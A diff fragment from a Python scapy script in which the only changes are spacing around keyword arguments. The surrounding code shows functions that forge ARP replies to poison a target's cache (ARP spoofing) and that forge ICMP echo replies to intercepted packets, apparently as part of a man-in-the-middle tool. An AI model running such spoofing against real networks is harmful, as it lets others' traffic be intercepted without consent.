@@ -21,7 +21,7 @@ def get_mac(ip):
 
 """---------------------------sends a spoofed ARP packet to the target device"""
 def spoof(target_ip, spoof_ip):
-    packet = scapy.Ether(dst=get_mac(target_ip)) / scapy.ARP(op = 2, 
+    packet = scapy.Ether(dst = get_mac(target_ip)) / scapy.ARP(op = 2, 
                             pdst = target_ip, 
                             hwdst = get_mac(target_ip),
                             psrc = spoof_ip)
@@ -41,10 +41,10 @@ def arp_spoof():
 
 """--------------------------------------sends an ICMP response to the source"""
 def send_icmp_response(packet):  # Create the ICMP response packet
-    resp = scapy.IP(dst=packet[IP].src, 
-                    src=packet[IP].dst)/scapy.ICMP(type='echo-reply', 
-                    id=packet[scapy.ICMP].id, 
-                    seq=packet[scapy.ICMP].seq)/packet[scapy.ICMP].payload
+    resp = scapy.IP(dst = packet[IP].src, 
+                    src = packet[IP].dst)/scapy.ICMP(type='echo-reply', 
+                    id = packet[scapy.ICMP].id, 
+                    seq = packet[scapy.ICMP].seq)/packet[scapy.ICMP].payload
     scapy.send(resp , verbose = False)       
 
 
